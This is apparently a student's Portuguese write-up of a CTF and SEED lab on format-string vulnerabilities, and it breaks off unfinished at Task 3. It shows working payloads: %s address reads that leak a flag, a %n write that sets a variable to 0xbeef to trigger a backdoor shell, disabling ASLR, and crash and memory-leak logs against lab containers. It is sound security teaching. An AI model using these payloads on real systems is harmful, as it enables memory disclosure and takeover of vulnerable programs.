# CTF 6 #

**Desafio 1** 
Neste desafio tinhamos de aceder ao endereço de memória, onde se encontrava a variável flag, e depois imprimir o seu conteúdo para o stdout. Primeiro, para saber qual era o endereço da variável flag era necessário usar o gdb, como era indicado no exploit, fazendo gdb attach pid, onde pid representa o pid do processo que executava o programa a explorar. Depois usando o comando do gdb: p &flag, é possível saber qual é o endereço da variável (0x804c060), que sendo estático, dá para utilizar em qualquer execução do programa.
Agora,acedendo ao endereço e utilizando o exploit com a linha `p.sendline(b"\x60\xc0\x04\x08" + b"%s")` é possível retirar o conteúdo desse endereço de memória e, assim, obtemos a flag que é necessário submeter.

**Desafio 2**
Neste desafio, não há nenhuma variável que tenha a flag pretendida em memória. No entanto, podemos obter essa flag, se conseguirmos alterar o conteúdo da variável key, que inicialmente tem o valor 0. Alterando o valor de key para 0xbeef, vai ser satisfeita a condição `if(key == 0xbeef)` que por sua vez vai permitir ter acesso ao código que abre um terminal, onde é possível aceder ao ficheiro flag.txt, para obter a flag. Para alterar o valor de key, usamos um ataque explorando uma format string vulnerability, tal como no desafio anterior, mas desta vez vamos escrever na memória. No ficheiro de exploit, vamos introduzir a linha  `p.sendline(b"AAAA" + b"\x34\xc0\x04\x08" + b"%48871d%n")`, no qual :
- `b"\x34\xc0\x04\x08"` corresponde ao endereço de key na memória, que é 0x0804c034.
- b"AAAA" são 4 caracteres aleatórios, que são introduzidos no inicio para permitir executar o ataque
- b"%48871d%n" corresponde ao número restante de bytes que queremos escrever em key, que são 48879 (o número decimal equivalente ao numero hexadecimal 0xbeef), ao qual retiramos 8 bytes (4 bytes dos 4 caracteres aleatórios e 4 bytes do endereço de memória) obtendo, então o total de 48871

Ao correr o exploit, o programa vai imprimir para o stdout "Backdoor activated", o que indica que o nosso ataque teve sucesso, e neste momento, temos um terminal, no qual podemos escrever `cat flag.txt` e assim obter a flag para submeter.

![screenshot](Week%206/backdoor.png)



# Tarefas da semana 6#

# Format Strings #
A função `printf()` em C é usada para imprimir uma string de acordo com um formato. O primeiro argumento da função chama-se _format string_ e define a forma como a string deve ser formatada. Existem programas que permitem ao utilizador fornecer todo ou grande parte do conteúdo da  _format string_. Tais conteúdos, quando fornecidos por utilizadores maliciosos, pode gerar uma vulnerabilidade no programa, uma **_format string vulnerability._**

# Setup #
Nesta parte, é necessário desligar as medidas de proteção impostas pelos sistemas operativos. Uma delas é a randomização do endereço de começo da _heap_ e da _stack_.

Tal proteção pode ser desligada com o seguinte comando: 
```shell
sudo sysctl -w kernel.randomize_va_space=0
```

É também necessário compilar o programa vulnerável (format.c). Para tal, usa-se o comando `make` já que os comandos de compilação são fornecidos em `Makefile`.

# Task 1: Crashing the Program #
Dois contentores são criados, cada um correndo um servidor vulnerável. Nesta tarefa, vamos utilizar o servidor 10.9.0.5, que corre um programa 32-bit com uma vulnerabilidade do tipo format-string. Abrimos dois terminais, sendo um o cliente e o outro o servidor. No cliente, enviamos uma mensagem de teste ao servidor `echo hello | nc 10.9.0.5 9090`. O servidor recebe a mensagem e retorna:

```shell
server-10.9.0.5 | Got a connection from 10.9.0.1
server-10.9.0.5 | Starting format
server-10.9.0.5 | The input buffer's address:    0xffa7b950
server-10.9.0.5 | The secret message's address:  0x080b4008
server-10.9.0.5 | The target variable's address: 0x080e5068
server-10.9.0.5 | Waiting for user input ......
server-10.9.0.5 | Received 6 bytes.
server-10.9.0.5 | Frame Pointer (inside myprintf):      0xffa7b878
server-10.9.0.5 | The target variable's value (before): 0x11223344
server-10.9.0.5 | hello
server-10.9.0.5 | The target variable's value (after):  0x11223344
server-10.9.0.5 | (^_^)(^_^)  Returned properly (^_^)(^_^)
```

Isto significa que tudo correu como o esperado.
O nosso objetivo é fornecer input ao servidor, de tal forma que, quando o servidor tentar imprimir esse mesmo input, usando a função myprintf(), vai crashar. Podemos perceber se myprintf() não está a retornar corretamente, se não retornar a mensagem `server-10.9.0.5 | (^_^)(^_^)  Returned properly (^_^)(^_^)`.
Para cumprir o nosso objetivo, usamos o programa build_string.py, que é fornecido. Compilando este programa, é criado um ficheiro executável badfile. O ficheiro badfile contém uma string com tamanho superior a 1500 bytes.
Agora que já temos uma string suficientemente grande, podemos dar início ao ataque. Para isso introduzimos no terminal do cliente `cat badfile | nc 10.9.0.5 9090`. Ao receber este input, o servidor retorna:

```shell
server-10.9.0.5 | Got a connection from 10.9.0.1
server-10.9.0.5 | Starting format
server-10.9.0.5 | The input buffer's address:    0xffe643a0
server-10.9.0.5 | The secret message's address:  0x080b4008
server-10.9.0.5 | The target variable's address: 0x080e5068
server-10.9.0.5 | Waiting for user input ......
server-10.9.0.5 | Received 1500 bytes.
server-10.9.0.5 | Frame Pointer (inside myprintf):      0xffe642c8
server-10.9.0.5 | The target variable's value (before): 0x11223344
```

A função myprintf() não retornou a mensagem `server-10.9.0.5 | (^_^)(^_^)  Returned properly (^_^)(^_^)`. Isto significa que, o ataque teve sucesso e o programa format crashou.

# Task 2: Printing Out the Server Program’s Memory #
**Task 2.A: Stack Data**:
O objetivo desta tarefa é fazer com que o servidor imprima alguns dados da sua memória, para tal, segue-se os seguintes passos:
- Usar como input: `%x%x%x%x%x%x%x%x`;
- `printf()` imprime o valor inteiro apontado pelo apontador de `va_list` e advança 4 bytes;
- O número de `%x` é decido pela distância entre o ponto initial de `va_list` e a variável e pode ser obtido por tentativa-erro. No nosso caso, esse número foi: 5

_Client_
```shell
[12/03/21]seed@VM:~/Week 6$ nc 10.9.0.5 9090
%x%x%x%x%x
^C
```
_Server_
```shell
server-10.9.0.5 | Waiting for user input ......
server-10.9.0.5 | Received 11 bytes.
server-10.9.0.5 | Frame Pointer (inside myprintf):      0xffe9b308
server-10.9.0.5 | The target variable's value (before): 0x11223344
server-10.9.0.5 | 1122334410008049db580e532080e61c0
server-10.9.0.5 | The target variable's value (after):  0x11223344
server-10.9.0.5 | (^_^)(^_^)  Returned properly (^_^)(^_^)
```

**Task 2.B: Heap Data**:
Nesta tarefa, o objetivo é imprimir uma mensagem secreta que está guardada na heap.
Para tal é necessário saber qual é o endereço desta mensagem, o que é possível através do código impresso pelo servidor.
```shell
server-10.9.0.5 | The input buffer's address:    0xffe9b3e0
server-10.9.0.5 | The secret message's address:  0x080b4008       <-- O endereço da mensagem
server-10.9.0.5 | The target variable's address: 0x080e5068
```

Colocando este endereço, na forma binária, na string de formatação, imprime-se a mensagem secreta, que é a seguinte:
```/bin/bash*-c*/bin/ls -l; echo '===== Success! ======'```

# Task 3: Modifying the Server Program’s Memory #
O objetivo desta tarefa é modificar o valor da variável `target`.

**Task 3.A: Change the value to a different value**
Nesta tarefa é pretendido alterar o valor da variável para qualquer outro valor. É necessário saber qual é o endereço desta variável, o que é possível através do código impresso pelo servidor.

```shell
server-10.9.0.5 | The input buffer's address:    0xffe9b3e0
server-10.9.0.5 | The secret message's address:  0x080b4008       
server-10.9.0.5 | The target variable's address: 0x080e5068     <-- O endereço da variável

server-10.9.0.5 | The target variable's value (before): 0x11223344 <-- O valor da variável antes da mudança
server-10.9.0.5 | The target variable's value (after):  0x11223344 <-- O valor da variável depois da mudança
server-10.9.0.5 | (^_^)(^_^)  Returned properly (^_^)(^_^)
```
Ora, sabendo que o endereço da variável é 0x080e5068, necessitamos de


**Task 3.B: Change the value to 0x5000**
